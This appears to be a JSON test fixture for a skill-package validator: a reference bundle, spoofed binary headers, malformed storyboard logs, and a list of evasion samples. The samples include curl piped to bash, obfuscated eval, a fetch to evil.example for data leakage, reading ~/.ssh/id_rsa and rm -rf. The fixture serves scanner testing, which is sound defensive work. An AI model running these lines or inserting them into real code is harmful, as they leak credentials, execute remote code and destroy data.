@@ -1,0 +1,171 @@
+{
+  "schema_version": "08.2-golden-v1",
+  "golden_bundle": {
+    "skill_name": "golden-repackaged-skill",
+    "description": "Deterministic certified skill package from upstream layout",
+    "capabilities": ["design-tokens", "layout-audit"],
+    "upstream_url": "https://github.com/example/golden-skill",
+    "text_files": [
+      {
+        "rel_path": "guide.md",
+        "expected_bucket": "references/guide.md",
+        "content": "# Guide\nUse tokens.\n"
+      },
+      {
+        "rel_path": "sub/helper.ts",
+        "expected_bucket": "scripts/sub/helper.ts",
+        "content": "export function computeSpacing(px: number): number { return px * 2; }\n"
+      }
+    ],
+    "binary_files": [
+      {
+        "rel_path": "icon.png",
+        "expected_bucket": "assets/icon.png",
+        "bytes": [137, 80, 78, 71, 13, 10, 26, 10, 0, 0, 0, 13, 73, 72, 68, 82, 0, 0, 0, 1, 0, 0, 0, 1, 8, 6, 0, 0, 0, 31, 21, 196, 137]
+      }
+    ],
+    "expected_package_sha256": "18d886c9d6c3f5581922ebec1a3ed8b537aee25045cc61f28b097003ea59c480",
+    "max_stub_size_bytes": 1536
+  },
+  "malicious_evasion_vectors": [
+    {
+      "id": "EVASION_MULTI_SPACE",
+      "filename": "setup.sh",
+      "content": "curl   |   bash -s"
+    },
+    {
+      "id": "EVASION_LINE_CONTINUATION",
+      "filename": "run.bash",
+      "content": "curl \\\n | bash"
+    },
+    {
+      "id": "EVASION_CONCAT_EVAL",
+      "filename": "mod.mjs",
+      "content": "const fn = 'ev' + 'al(userInput)';"
+    },
+    {
+      "id": "EVASION_BASE64_DECODE",
+      "filename": "decode.zsh",
+      "content": "echo payload | base64 -d"
+    },
+    {
+      "id": "EVASION_DENO_COMMAND",
+      "filename": "spawn.tsx",
+      "content": "new Deno.Command('sh')"
+    },
+    {
+      "id": "EVASION_FETCH_EGRESS",
+      "filename": "exfil.jsx",
+      "content": "await fetch('https://evil.example/leak')"
+    },
+    {
+      "id": "EVASION_SHORT_TRAVERSAL",
+      "filename": "read.py",
+      "content": "open('../.ssh/id_rsa')"
+    },
+    {
+      "id": "EVASION_NO_SPACE_PIPE",
+      "filename": "pipe.sh",
+      "content": "curl|bash"
+    },
+    {
+      "id": "EVASION_MIXED_CONCAT",
+      "filename": "mix.js",
+      "content": "const f = 'ev' +\n\"al(x)\";"
+    },
+    {
+      "id": "EVASION_BACKSLASH_SPLIT",
+      "filename": "bs.js",
+      "content": "ev\\\nal(x)"
+    },
+    {
+      "id": "EVASION_SHELL_BARE_EVAL",
+      "filename": "bare.sh",
+      "content": "eval \"$CMD\""
+    },
+    {
+      "id": "EVASION_INDIRECT_EVAL",
+      "filename": "indir.ts",
+      "content": "(0, eval)('1+1')"
+    },
+    {
+      "id": "EVASION_BUN_DOLLAR",
+      "filename": "bunsh.ts",
+      "content": "await Bun.$`rm -rf /tmp/x`"
+    }
+  ],
+  "binary_spoof_vectors": [
+    {
+      "id": "SPOOF_ELF_AS_PNG",
+      "rel_path": "fake.png",
+      "bytes": [127, 69, 76, 70, 2, 1, 1, 0, 0, 0, 0, 0]
+    },
+    {
+      "id": "SPOOF_MACHO_AS_DAT",
+      "rel_path": "macho.png",
+      "bytes": [207, 250, 237, 254, 7, 0, 0, 1]
+    },
+    {
+      "id": "SPOOF_MACHO_UNIV64",
+      "rel_path": "univ64.png",
+      "bytes": [202, 254, 186, 191, 0, 0, 0, 2]
+    },
+    {
+      "id": "SPOOF_WASM_AS_WEBP",
+      "rel_path": "mod.webp",
+      "bytes": [0, 97, 115, 109, 1, 0, 0, 0, 87, 69, 66, 80]
+    },
+    {
+      "id": "SPOOF_NON_UTF8_JS",
+      "rel_path": "bad.js",
+      "bytes": [255, 254, 0, 1, 130, 131]
+    },
+    {
+      "id": "UNSUPPORTED_EXT",
+      "rel_path": "unknown.xyz",
+      "bytes": [104, 101, 108, 108, 111]
+    }
+  ],
+  "invalid_storyboards": [
+    {
+      "id": "BAD_TIMESTAMP",
+      "log": "[frame: bad] -> Click: Invalid"
+    },
+    {
+      "id": "MISSING_FRAME_PREFIX",
+      "log": "[00:01.00] -> Click: Missing frame prefix"
+    },
+    {
+      "id": "SECONDS_OVER_59",
+      "log": "[frame: 00:99.00] -> Click: Range overflow"
+    },
+    {
+      "id": "NEGATIVE_TIMESTAMP",
+      "log": "[frame: -00:01.00] -> Click: Negative"
+    },
+    {
+      "id": "BARE_FLOAT",
+      "log": "[frame: 12.34] -> Click: Missing colon"
+    },
+    {
+      "id": "NON_MONOTONIC",
+      "log": "[frame: 00:05.00] -> A: First\n[frame: 00:02.00] -> B: Second"
+    },
+    {
+      "id": "EMPTY_LOG",
+      "log": "   \n  \n"
+    },
+    {
+      "id": "MISSING_FRACTIONAL_SECONDS",
+      "log": "[frame: 00:01] -> Click: Continue"
+    },
+    {
+      "id": "EXTRA_HOURS_SEGMENT",
+      "log": "[frame: 01:00:01.00] -> Click: Continue"
+    },
+    {
+      "id": "BAD_FRACTION_LEN",
+      "log": "[frame: 00:01.1] -> Click: Continue"
+    }
+  ]
+}
